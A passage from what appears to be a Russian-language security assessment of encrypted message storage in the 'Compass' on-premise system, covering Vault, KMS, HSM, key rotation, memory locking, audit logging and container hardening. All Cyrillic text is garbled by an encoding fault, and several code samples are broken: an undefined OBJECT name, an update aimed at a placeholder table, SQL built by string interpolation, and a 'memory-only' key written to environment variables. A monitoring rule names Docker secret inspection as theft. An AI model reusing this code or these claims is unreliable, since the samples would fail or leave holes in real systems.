        new_dek = os.urandom(32)
        self.client.secrets.kv.v2.create_or_update_secret(
            path='compass/dek',
            secret={'key': base64.b64encode(new_dek).decode()}
        )
```

#### –í–∞—Ä–∏–∞–Ω—Ç B: AWS KMS (–¥–ª—è AWS on-premise)

```yaml
database_encryption:
  mode: "read_write"
  key_management: "aws_kms"
  kms:
    region: "us-east-1"
    key_id: "arn:aws:kms:us-east-1:123456789:key/..."
    # –ê—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è —á–µ—Ä–µ–∑ IAM Role –∏–ª–∏ Instance Profile
```

#### –í–∞—Ä–∏–∞–Ω—Ç C: Manual Unlock (–¥–ª—è –º–∞–∫—Å–∏–º–∞–ª—å–Ω–æ–π –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏)

```yaml
database_encryption:
  mode: "read_write"
  key_management: "manual"
  unlock:
    method: "interactive"  # –¢—Ä–µ–±–æ–≤–∞—Ç—å –≤–≤–æ–¥ –ø—Ä–∏ —Å—Ç–∞—Ä—Ç–µ
    timeout: 300  # –¢–∞–π–º–∞—É—Ç –æ–∂–∏–¥–∞–Ω–∏—è –≤–≤–æ–¥–∞
```

```python
# –ü—Ä–∏ —Å—Ç–∞—Ä—Ç–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è:
import getpass

def unlock_encryption():
    print("=" * 60)
    print("COMPASS ENCRYPTION UNLOCK")
    print("=" * 60)
    print("–í–≤–µ–¥–∏—Ç–µ –º–∞—Å—Ç–µ—Ä-–∫–ª—é—á –¥–ª—è —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∫–∏ –±–∞–∑—ã –¥–∞–Ω–Ω—ã—Ö.")
    print("–ö–ª—é—á –ù–ï —Å–æ—Ö—Ä–∞–Ω—è–µ—Ç—Å—è –Ω–∞ –¥–∏—Å–∫ –∏ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç —Ç–æ–ª—å–∫–æ –≤ –ø–∞–º—è—Ç–∏.")
    print()

    master_key = getpass.getpass("Master Key (base64): ")

    # –ü—Ä–æ–≤–µ—Ä–∫–∞ –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ—Å—Ç–∏
    try:
        decoded = base64.b64decode(master_key)
        if len(decoded) != 32:
            raise ValueError("Invalid key length")
    except:
        print("ERROR: Invalid master key format")
        sys.exit(1)

    # –°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ –¢–û–õ–¨–ö–û –≤ –ø–∞–º—è—Ç–∏ (–Ω–µ –≤ —Ñ–∞–π–ª)
    os.environ['DATABASE_ENCRYPTION_MASTER_KEY'] = master_key
    print("‚úì Encryption unlocked successfully")
```

**–ü—Ä–µ–∏–º—É—â–µ—Å—Ç–≤–∞:**
- –ö–ª—é—á –ù–ò–ö–û–ì–î–ê –Ω–µ —Ö—Ä–∞–Ω–∏—Ç—Å—è –Ω–∞ –¥–∏—Å–∫–µ
- –ù–µ–≤–æ–∑–º–æ–∂–Ω–æ –∏–∑–≤–ª–µ—á—å –∏–∑ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏
- –§–∏–∑–∏—á–µ—Å–∫–∞—è –∫—Ä–∞–∂–∞ —Å–µ—Ä–≤–µ—Ä–∞ –±–µ—Å–ø–æ–ª–µ–∑–Ω–∞

**–ù–µ–¥–æ—Å—Ç–∞—Ç–∫–∏:**
- –ù–µ—Ç –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–≥–æ –ø–µ—Ä–µ–∑–∞–ø—É—Å–∫–∞
- –¢—Ä–µ–±—É–µ—Ç—Å—è —á–µ–ª–æ–≤–µ–∫ –¥–ª—è –≤–≤–æ–¥–∞ –∫–ª—é—á–∞

---

### üéØ –ü–†–ò–û–†–ò–¢–ï–¢ 2: –†–æ—Ç–∞—Ü–∏—è –∫–ª—é—á–µ–π (Key Rotation)

**–†–µ—à–µ–Ω–∏–µ:**

```yaml
# configs/database.yaml
database_encryption:
  mode: "read_write"
  rotation:
    enabled: true
    schedule: "0 0 1 * *"  # –ö–∞–∂–¥–æ–µ 1-–µ —á–∏—Å–ª–æ –º–µ—Å—è—Ü–∞
    re_encrypt_batch_size: 1000  # –°–æ–æ–±—â–µ–Ω–∏–π –∑–∞ —Ä–∞–∑

  keys:
    - id: "key-2024-01"
      version: 1
      created_at: "2024-01-01T00:00:00Z"
      deprecated_at: "2024-07-01T00:00:00Z"  # –¢–æ–ª—å–∫–æ –¥–ª—è —á—Ç–µ–Ω–∏—è
      master_key_ref: "vault:v1/compass/master-key"

    - id: "key-2024-07"
      version: 2
      created_at: "2024-07-01T00:00:00Z"
      active: true  # –¢–µ–∫—É—â–∏–π –∫–ª—é—á –¥–ª—è –∑–∞–ø–∏—Å–∏
      master_key_ref: "vault:v2/compass/master-key"
```

**–ü—Ä–æ—Ü–µ—Å—Å —Ä–æ—Ç–∞—Ü–∏–∏:**

```python
# script/rotate_encryption_key.py

def rotate_encryption_key(company_id):
    """–†–æ—Ç–∞—Ü–∏—è –∫–ª—é—á–∞ —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è –¥–ª—è –∫–æ–º–ø–∞–Ω–∏–∏"""

    print(f"Starting key rotation for company {company_id}")

    # 1. –°–æ–∑–¥–∞–Ω–∏–µ –Ω–æ–≤–æ–≥–æ –∫–ª—é—á–∞
    new_dek = os.urandom(32)
    new_key_version = create_new_key_version(new_dek)
    print(f"‚úì Created new key version: {new_key_version}")

    # 2. –ü–æ–ª—É—á–µ–Ω–∏–µ —Å–ø–∏—Å–∫–∞ –≤—Å–µ—Ö –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω—ã—Ö —Ç–∞–±–ª–∏—Ü
    tables = [
        'message_block_1', 'message_block_2', ..., 'message_block_12'
    ]

    total_messages = 0
    re_encrypted = 0

    for table in tables:
        print(f"Processing table: {table}")

        # 3. –ü–æ–ª—É—á–µ–Ω–∏–µ –≤—Å–µ—Ö —Å–æ–æ–±—â–µ–Ω–∏–π –≤ —Ç–∞–±–ª–∏—Ü–µ
        cursor.execute(f"""
            SELECT message_id, data, key_version
            FROM company_conversation.{table}
            WHERE key_version < {new_key_version}
        """)

        messages = cursor.fetchall()
        total_messages += len(messages)

        # 4. –ü–µ—Ä–µ—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ –±–∞—Ç—á–∞–º–∏
        for batch in chunks(messages, 1000):
            re_encrypt_batch(batch, new_dek, new_key_version)
            re_encrypted += len(batch)
            print(f"  Re-encrypted: {re_encrypted}/{total_messages}")

    # 5. –û—Ç–º–µ—Ç–∫–∞ —Å—Ç–∞—Ä–æ–≥–æ –∫–ª—é—á–∞ –∫–∞–∫ deprecated
    deprecate_old_key(new_key_version - 1)

    print(f"‚úì Key rotation completed: {re_encrypted} messages")

def re_encrypt_batch(messages, new_dek, new_version):
    """–ü–µ—Ä–µ—à–∏—Ñ—Ä–æ–≤—ã–≤–∞–µ—Ç –±–∞—Ç—á —Å–æ–æ–±—â–µ–Ω–∏–π"""

    for msg_id, encrypted_data, old_version in messages:
        # –†–∞—Å—à–∏—Ñ—Ä–æ–≤–∫–∞ —Å—Ç–∞—Ä—ã–º –∫–ª—é—á–æ–º
        old_dek = get_key_by_version(old_version)
        plaintext = decrypt_message(encrypted_data, old_dek)

        # –®–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ –Ω–æ–≤—ã–º –∫–ª—é—á–æ–º
        new_encrypted = encrypt_message(plaintext, new_dek)

        # –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –≤ –ë–î
        cursor.execute(f"""
            UPDATE company_conversation.message_block_X
            SET data = %s, key_version = %s
            WHERE message_id = %s
        """, (new_encrypted, new_version, msg_id))

    conn.commit()
```

**–ó–∞–ø—É—Å–∫ —Ä–æ—Ç–∞—Ü–∏–∏:**

```bash
# –†—É—á–Ω–∞—è —Ä–æ—Ç–∞—Ü–∏—è
$ sudo python3 script/rotate_encryption_key.py --company-id=1

# –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∞—è (—á–µ—Ä–µ–∑ cron)
$ crontab -e
0 0 1 * * /usr/bin/python3 /opt/compass/script/rotate_encryption_key.py --all-companies
```

**–ü—Ä–µ–∏–º—É—â–µ—Å—Ç–≤–∞:**
- –û–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–µ –≤—Ä–µ–º–µ–Ω–∏ –∂–∏–∑–Ω–∏ –∫–ª—é—á–∞
- –ü—Ä–∏ –∫–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü–∏–∏ - —Ç–æ–ª—å–∫–æ –Ω–æ–≤—ã–µ –¥–∞–Ω–Ω—ã–µ –ø–æ–¥ —É–≥—Ä–æ–∑–æ–π
- Compliance —Å —Ä–µ–≥—É–ª—è—Ç–æ—Ä–Ω—ã–º–∏ —Ç—Ä–µ–±–æ–≤–∞–Ω–∏—è–º–∏

---

### üéØ –ü–†–ò–û–†–ò–¢–ï–¢ 3: Hardware Security Module (HSM)

**–†–µ—à–µ–Ω–∏–µ:** –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –∞–ø–ø–∞—Ä–∞—Ç–Ω–æ–≥–æ HSM –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è –∫–ª—é—á–µ–π.

```yaml
database_encryption:
  mode: "read_write"
  key_management: "hsm"
  hsm:
    type: "pkcs11"  # –ò–ª–∏ "yubihsm2", "thales", "gemalto"
    library: "/usr/lib/softhsm2/libsofthsm2.so"
    slot: 0
    pin: "${HSM_PIN}"  # –ò–∑ Docker Secret
    key_label: "compass-dek"
```

**–ü—Ä–µ–∏–º—É—â–µ—Å—Ç–≤–∞:**
- –ö–ª—é—á–∏ –ù–ò–ö–û–ì–î–ê –Ω–µ –ø–æ–∫–∏–¥–∞—é—Ç HSM
- –£—Å—Ç–æ–π—á–∏–≤–æ—Å—Ç—å –∫ physical attacks
- FIPS 140-2 Level 3/4 compliance
- –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–µ —É–Ω–∏—á—Ç–æ–∂–µ–Ω–∏–µ –ø—Ä–∏ tampering

**–ù–µ–¥–æ—Å—Ç–∞—Ç–∫–∏:**
- –í—ã—Å–æ–∫–∞—è —Å—Ç–æ–∏–º–æ—Å—Ç—å ($1000-$10000 –∑–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ)
- –°–ª–æ–∂–Ω–æ—Å—Ç—å –∏–Ω—Ç–µ–≥—Ä–∞—Ü–∏–∏
- Single point of failure (—Ç—Ä–µ–±—É–µ—Ç—Å—è —Ä–µ–∑–µ—Ä–≤–∏—Ä–æ–≤–∞–Ω–∏–µ)

**–ü—Ä–∏–º–µ—Ä –∏–Ω—Ç–µ–≥—Ä–∞—Ü–∏–∏ —Å YubiHSM2:**

```python
from yubihsm import YubiHsm
from yubihsm.defs import ALGORITHM, CAPABILITY
from yubihsm.objects import AsymmetricKey

class YubiHSMKeyProvider:
    def __init__(self, connector_url, auth_key_id, password):
        self.hsm = YubiHsm.connect(connector_url)
        self.session = self.hsm.create_session_derived(
            auth_key_id, password
        )

    def encrypt_dek(self, dek):
        """–®–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ DEK –≤ HSM (–∫–ª—é—á –ù–ï –ø–æ–∫–∏–¥–∞–µ—Ç —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ)"""
        wrap_key = self.session.get_object(
            object_id=1,
            object_type=OBJECT.WRAP_KEY
        )
        return wrap_key.export_wrapped(dek)

    def decrypt_dek(self, wrapped_dek):
        """–†–∞—Å—à–∏—Ñ—Ä–æ–≤–∫–∞ DEK –≤ HSM"""
        wrap_key = self.session.get_object(
            object_id=1,
            object_type=OBJECT.WRAP_KEY
        )
        return wrap_key.import_wrapped(wrapped_dek)
```

---

### üéØ –ü–†–ò–û–†–ò–¢–ï–¢ 4: –ó–∞—â–∏—Ç–∞ –ø–∞–º—è—Ç–∏ (Memory Protection)

**–†–µ—à–µ–Ω–∏–µ:** –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –∑–∞—â–∏—â–µ–Ω–Ω—ã—Ö –±—É—Ñ–µ—Ä–æ–≤ –¥–ª—è –∫–ª—é—á–µ–π.

```python
# utils/secure_memory.py
import ctypes
import os
from ctypes import c_void_p, c_size_t

# –ó–∞–≥—Ä—É–∑–∫–∞ libc
libc = ctypes.CDLL("libc.so.6")

# –û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ —Ñ—É–Ω–∫—Ü–∏–π
mlock = libc.mlock
mlock.argtypes = [c_void_p, c_size_t]
mlock.restype = ctypes.c_int

munlock = libc.munlock
munlock.argtypes = [c_void_p, c_size_t]
munlock.restype = ctypes.c_int

class SecureBuffer:
    """–ó–∞—â–∏—â–µ–Ω–Ω—ã–π –±—É—Ñ–µ—Ä –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è –∫–ª—é—á–µ–π –≤ –ø–∞–º—è—Ç–∏"""

    def __init__(self, size):
        self.size = size
        self.buffer = ctypes.create_string_buffer(size)
        self.addr = ctypes.addressof(self.buffer)

        # –ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞ —Å—Ç—Ä–∞–Ω–∏—Ü –≤ –ø–∞–º—è—Ç–∏ (–Ω–µ swapping)
        result = mlock(self.addr, self.size)
        if result != 0:
            raise OSError("Failed to lock memory")

    def write(self, data):
        """–ó–∞–ø–∏—Å—å –¥–∞–Ω–Ω—ã—Ö –≤ –∑–∞—â–∏—â–µ–Ω–Ω—ã–π –±—É—Ñ–µ—Ä"""
        if len(data) > self.size:
            raise ValueError("Data too large for buffer")
        ctypes.memmove(self.addr, data, len(data))

    def read(self):
        """–ß—Ç–µ–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö –∏–∑ –±—É—Ñ–µ—Ä–∞"""
        return self.buffer.raw[:self.size]

    def clear(self):
        """–ë–µ–∑–æ–ø–∞—Å–Ω–∞—è –æ—á–∏—Å—Ç–∫–∞ –±—É—Ñ–µ—Ä–∞"""
        # –ü–µ—Ä–µ–∑–∞–ø–∏—Å—å –Ω—É–ª—è–º–∏
        ctypes.memset(self.addr, 0, self.size)
        # –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ —Å–ª—É—á–∞–π–Ω—ã–º–∏ –¥–∞–Ω–Ω—ã–º–∏
        random_data = os.urandom(self.size)
        ctypes.memmove(self.addr, random_data, self.size)
        # –°–Ω–æ–≤–∞ –Ω—É–ª—è–º–∏
        ctypes.memset(self.addr, 0, self.size)

    def __del__(self):
        """–î–µ—Å—Ç—Ä—É–∫—Ç–æ—Ä: –æ—á–∏—Å—Ç–∫–∞ –∏ —Ä–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∫–∞"""
        self.clear()
        munlock(self.addr, self.size)

# –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ:
def decrypt_message_secure(encrypted_data):
    # –°–æ–∑–¥–∞–Ω–∏–µ –∑–∞—â–∏—â–µ–Ω–Ω–æ–≥–æ –±—É—Ñ–µ—Ä–∞ –¥–ª—è DEK
    dek_buffer = SecureBuffer(32)

    try:
        # –ü–æ–ª—É—á–µ–Ω–∏–µ DEK
        dek = get_dek_from_secret()
        dek_buffer.write(dek)

        # –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ DEK –¥–ª—è —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∫–∏
        plaintext = decrypt(encrypted_data, dek_buffer.read())

        return plaintext

    finally:
        # –ì–∞—Ä–∞–Ω—Ç–∏—Ä–æ–≤–∞–Ω–Ω–∞—è –æ—á–∏—Å—Ç–∫–∞ –ø–∞–º—è—Ç–∏
        dek_buffer.clear()
```

**–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ: Core dump protection**

```bash
# /etc/security/limits.conf
*    hard    core    0  # –ó–∞–ø—Ä–µ—Ç core dumps

# –ò–ª–∏ –¥–ª—è –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞:
# docker-compose.yml
services:
  php-monolith:
    ulimits:
      core: 0
    security_opt:
      - no-new-privileges:true
```

---

### üéØ –ü–†–ò–û–†–ò–¢–ï–¢ 5: –ê—É–¥–∏—Ç –∏ –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥

**–†–µ—à–µ–Ω–∏–µ:** –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –≤—Å–µ—Ö –æ–ø–µ—Ä–∞—Ü–∏–π —Å –∫–ª—é—á–∞–º–∏.

```python
# utils/encryption_audit.py
import logging
import json
from datetime import datetime

class EncryptionAuditor:
    """–ê—É–¥–∏—Ç –æ–ø–µ—Ä–∞—Ü–∏–π —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è"""

    def __init__(self, log_file="/var/log/compass/encryption_audit.log"):
        self.logger = logging.getLogger("encryption_audit")
        handler = logging.FileHandler(log_file)
        handler.setFormatter(logging.Formatter(
            '%(asctime)s [%(levelname)s] %(message)s'
        ))
        self.logger.addHandler(handler)
        self.logger.setLevel(logging.INFO)

    def log_key_access(self, operation, key_version=None, user=None):
        """–õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –¥–æ—Å—Ç—É–ø–∞ –∫ –∫–ª—é—á–∞–º"""
        event = {
            "timestamp": datetime.utcnow().isoformat(),
            "operation": operation,
            "key_version": key_version,
            "user": user or os.getenv("USER"),
            "container_id": os.getenv("HOSTNAME"),
            "success": True
        }
        self.logger.info(json.dumps(event))

    def log_decryption(self, message_id, user_id):
        """–õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏—è"""
        event = {
            "timestamp": datetime.utcnow().isoformat(),
            "operation": "decrypt_message",
            "message_id": message_id,
            "user_id": user_id
        }
        self.logger.info(json.dumps(event))

    def log_key_rotation(self, old_version, new_version, messages_count):
        """–õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ —Ä–æ—Ç–∞—Ü–∏–∏ –∫–ª—é—á–∞"""
        event = {
            "timestamp": datetime.utcnow().isoformat(),
            "operation": "key_rotation",
            "old_version": old_version,
            "new_version": new_version,
            "messages_re_encrypted": messages_count
        }
        self.logger.info(json.dumps(event))

# –ò–Ω—Ç–µ–≥—Ä–∞—Ü–∏—è —Å –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–æ–º
auditor = EncryptionAuditor()

def get_dek():
    auditor.log_key_access("get_dek", key_version=CURRENT_KEY_VERSION)
    # ... –ø–æ–ª—É—á–µ–Ω–∏–µ –∫–ª—é—á–∞ ...
```

**–ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω–æ–π –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏:**

```python
# monitoring/security_alerts.py
from prometheus_client import Counter, Histogram

# –ú–µ—Ç—Ä–∏–∫–∏
encryption_operations = Counter(
    'compass_encryption_operations_total',
    'Total encryption/decryption operations',
    ['operation', 'status']
)

key_access_duration = Histogram(
    'compass_key_access_duration_seconds',
    'Time to access encryption key'
)

# –ê–ª–µ—Ä—Ç—ã
def check_suspicious_activity():
    """–ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω–æ–π –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏"""

    # 1. –ú–∞—Å—Å–æ–≤–æ–µ —á—Ç–µ–Ω–∏–µ –∫–ª—é—á–µ–π
    key_access_rate = get_metric_rate('key_access', window='1m')
    if key_access_rate > 1000:  # > 1000 –æ–±—Ä–∞—â–µ–Ω–∏–π –≤ –º–∏–Ω—É—Ç—É
        send_alert(
            severity="HIGH",
            message=f"Suspicious key access rate: {key_access_rate}/min"
        )

    # 2. –î–æ—Å—Ç—É–ø –∫ –∫–ª—é—á–∞–º –∏–∑ –Ω–µ–æ–±—ã—á–Ω—ã—Ö –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–æ–≤
    authorized_containers = ['php-monolith', 'php-migration']
    for container in get_containers_accessing_keys():
        if container not in authorized_containers:
            send_alert(
                severity="CRITICAL",
                message=f"Unauthorized key access from: {container}"
            )

    # 3. –ü–æ–ø—ã—Ç–∫–∏ –∏–∑–≤–ª–µ—á–µ–Ω–∏—è Docker secrets
    audit_logs = parse_docker_audit_logs()
    for log in audit_logs:
        if 'secret inspect' in log['command']:
            send_alert(
                severity="CRITICAL",
                message=f"Docker secret inspection attempt by {log['user']}"
            )
```

---

### üéØ –ü–†–ò–û–†–ò–¢–ï–¢ 6: –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ —Ä–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏

#### A. Full Disk Encryption (FDE)

```bash
# LUKS —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ –¥–∏—Å–∫–∞
$ cryptsetup luksFormat /dev/sda2
$ cryptsetup open /dev/sda2 encrypted_root
$ mkfs.ext4 /dev/mapper/encrypted_root

# –ü—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ: —Ç—Ä–µ–±–æ–≤–∞—Ç—å passphrase –∏–ª–∏ TPM unlock
```

#### B. Immutable Infrastructure

```yaml
# docker-compose.yml
services:
  php-monolith:
    read_only: true  # –§–∞–π–ª–æ–≤–∞—è —Å–∏—Å—Ç–µ–º–∞ —Ç–æ–ª—å–∫–æ –¥–ª—è —á—Ç–µ–Ω–∏—è
    tmpfs:
      - /tmp
      - /var/run
    volumes:
      - type: bind
        source: /run/secrets
        target: /run/secrets
        read_only: true  # –°–µ–∫—Ä–µ—Ç—ã —Ç–æ–ª—å–∫–æ –¥–ª—è —á—Ç–µ–Ω–∏—è
```

#### C. Network Segmentation

```yaml
# –ò–∑–æ–ª—è—Ü–∏—è –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–æ–≤ —Å –∫–ª—é—á–∞–º–∏
networks:
  encryption_zone:
    driver: overlay
    internal: true  # –ù–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ –≤–Ω–µ—à–Ω–µ–π —Å–µ—Ç–∏
    ipam:
      config:
        - subnet: 10.0.100.0/24

services:
  php-monolith:
    networks:
      - encryption_zone  # –ò–∑–æ–ª–∏—Ä–æ–≤–∞–Ω–Ω–∞—è —Å–µ—Ç—å
      - app_network     # –¢–æ–ª—å–∫–æ –¥–ª—è –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã—Ö —Å–µ—Ä–≤–∏—Å–æ–≤
```

#### D. –ü—Ä–∏–Ω—Ü–∏–ø –Ω–∞–∏–º–µ–Ω—å—à–∏—Ö –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π

```dockerfile
# Dockerfile –¥–ª—è php-monolith
FROM php:8.2-fpm

# –°–æ–∑–¥–∞–Ω–∏–µ –Ω–µ–ø—Ä–∏–≤–∏–ª–µ–≥–∏—Ä–æ–≤–∞–Ω–Ω–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
RUN useradd -u 1000 -m -s /bin/bash compass

# –ù–ï –∑–∞–ø—É—Å–∫–∞—Ç—å –æ—Ç root
USER compass

# –û–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–µ capabilities
# docker-compose.yml:
services:
  php-monolith:
    cap_drop:
      - ALL
    cap_add:
      - NET_BIND_SERVICE  # –¢–æ–ª—å–∫–æ –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–µ
```

---

## –í—ã–≤–æ–¥—ã

### –û–±—â–∞—è –æ—Ü–µ–Ω–∫–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏

**–¢–µ–∫—É—â–∏–π —É—Ä–æ–≤–µ–Ω—å:** üü° **–°–†–ï–î–ù–ò–ô** (6/10)

| –ö—Ä–∏—Ç–µ—Ä–∏–π | –û—Ü–µ–Ω–∫–∞ | –ö–æ–º–º–µ–Ω—Ç–∞—Ä–∏–π |
|----------|--------|-------------|
| –ê–ª–≥–æ—Ä–∏—Ç–º —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è | 9/10 | AES-256-CBC - –∏–Ω–¥—É—Å—Ç—Ä–∏–∞–ª—å–Ω—ã–π —Å—Ç–∞–Ω–¥–∞—Ä—Ç |
| –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –∫–ª—é—á–∞–º–∏ | 3/10 | –û–±–∞ –∫–ª—é—á–∞ –Ω–∞ –æ–¥–Ω–æ–º —Å–µ—Ä–≤–µ—Ä–µ |
| –ó–∞—â–∏—Ç–∞ –æ—Ç –≤–Ω–µ—à–Ω–∏—Ö –∞—Ç–∞–∫ | 9/10 | –î–∞–Ω–Ω—ã–µ –≤ –ë–î –∑–∞—â–∏—â–µ–Ω—ã |
| –ó–∞—â–∏—Ç–∞ –æ—Ç –∏–Ω—Å–∞–π–¥–µ—Ä–æ–≤ | 2/10 | Root-–¥–æ—Å—Ç—É–ø = –ø–æ–ª–Ω–∞—è –∫–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü–∏—è |
| –†–æ—Ç–∞—Ü–∏—è –∫–ª—é—á–µ–π | 0/10 | –û—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç |
| –ê—É–¥–∏—Ç | 2/10 | –ú–∏–Ω–∏–º–∞–ª—å–Ω–æ–µ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ |
| Compliance | 4/10 | –ù–µ —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É–µ—Ç PCI DSS, —á–∞—Å—Ç–∏—á–Ω–æ GDPR |

### –°—Ä–∞–≤–Ω–µ–Ω–∏–µ —Å –¥—Ä—É–≥–∏–º–∏ —Ä–µ—à–µ–Ω–∏—è–º–∏

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ –£—Ä–æ–≤–µ–Ω—å –∑–∞—â–∏—Ç—ã (0-10)                                  ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ –ù–µ—Ç —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è                            ‚ñà‚ñà 2/10      ‚îÇ
‚îÇ Compass On-premise (—Ç–µ–∫—É—â–µ–µ)              ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà 6/10  ‚îÇ
‚îÇ Compass + Vault/KMS                       ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà 8/10‚îÇ
‚îÇ Compass + HSM                             ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà 9/10‚îÇ
‚îÇ E2E —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ –Ω–∞ –∫–ª–∏–µ–Ω—Ç–∞—Ö                ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà 10/10‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

### –í—Ä–µ–º—è –Ω–∞ –∫–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü–∏—é

| –ê—Ç–∞–∫—É—é—â–∏–π | –î–æ—Å—Ç—É–ø | –í—Ä–µ–º—è | –°–ª–æ–∂–Ω–æ—Å—Ç—å |
|-----------|--------|-------|-----------|
| –í–Ω–µ—à–Ω–∏–π —Ö–∞–∫–µ—Ä | –ù–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —Å–µ—Ä–≤–µ—Ä—É | ‚àû | ‚õî –ù–µ–≤–æ–∑–º–æ–∂–Ω–æ |
